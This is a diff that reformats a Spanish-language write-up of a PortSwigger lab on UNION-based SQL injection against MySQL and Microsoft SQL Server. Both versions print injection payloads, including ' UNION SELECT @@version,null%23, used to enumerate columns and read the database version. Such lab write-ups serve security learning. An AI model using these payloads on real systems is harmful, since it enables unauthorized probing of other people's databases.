@@ -1,11 +1,60 @@
-[SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
-MySQL y Microsoft funcionan de la misma manera, por lo que se haría de la siguiente manera:
-`' UNION SELECT null,null#`
-Pero en este reto, el `#` no lo detecta correctamente, ya que el comentario deberia ser con este tipo, por lo que se debe hacer para colocarlo correctamente seria encodearlo en formato url `%23`
-quedando de la siguiente manera: `' union select null,null%23`
+# SQL Injection Attack - Querying Database Version on MySQL and Microsoft
 
-![[Pasted image 20260329212129.png]]
+## 📌 Lab Information
 
-teniendo esto listo, investigamos que la manera correcta de sacar la versión de MySQL y Microsoft es `@@version` y no necesitamos apuntar a una tabla real para poder ejecutar esta sentencia:
+- **Lab:** Querying Database Version on MySQL and Microsoft
+- **Categoría:** UNION SQL Injection
 
-![[Pasted image 20260329212223.png]]
+🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
+
+---
+
+## 🎯 Objetivo
+
+Obtener la versión de la base de datos MySQL o Microsoft SQL Server.
+
+---
+
+## 🔍 Enumeración de columnas
+
+Probamos:
+
+```sql
+' UNION SELECT null,null#
+```
+
+El comentario `#` debe ir URL Encoded:
+
+```sql
+' UNION SELECT null,null%23
+```
+
+![Enumeración columnas](Imagenes/pasted-image-20260329212129.png)
+
+---
+
+## 🚀 Obtención de versión
+
+En MySQL y Microsoft SQL Server puede utilizarse:
+
+```sql
+@@version
+```
+
+Payload final:
+
+```sql
+' UNION SELECT @@version,null%23
+```
+
+Resultado:
+
+![Versión BD](Imagenes/pasted-image-20260329212223.png)
+
+---
+
+## ✅ Resultado
+
+Se obtuvo exitosamente:
+- Tipo de motor
+- Versión exacta de la base de datos
